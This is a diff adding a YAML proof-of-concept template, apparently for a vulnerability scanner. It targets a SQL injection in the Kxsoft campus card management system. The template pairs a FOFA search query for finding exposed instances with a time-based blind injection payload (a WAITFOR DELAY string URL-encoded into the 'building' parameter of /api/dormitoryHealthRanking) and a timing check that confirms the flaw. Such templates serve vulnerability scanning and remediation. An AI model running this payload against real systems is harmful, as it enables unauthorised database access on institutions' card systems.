@@ -1,0 +1,20 @@
+id: poc-yaml-kxsoft-dormitoryhealthranking-sqli
+info:
+  name: 科讯一卡通管理系统 dormitoryHealthRanking SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 一卡通管理系统
+  fofa: body="http://www.ahkxsoft.com/" && body="一卡通登录"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"一卡通")
+- method: GET
+  path: /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: "status_code == 200 && \ncontains(body,\"\\\"list\\\":\") &&\ncontains(content_type,\"\
+    application/json\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
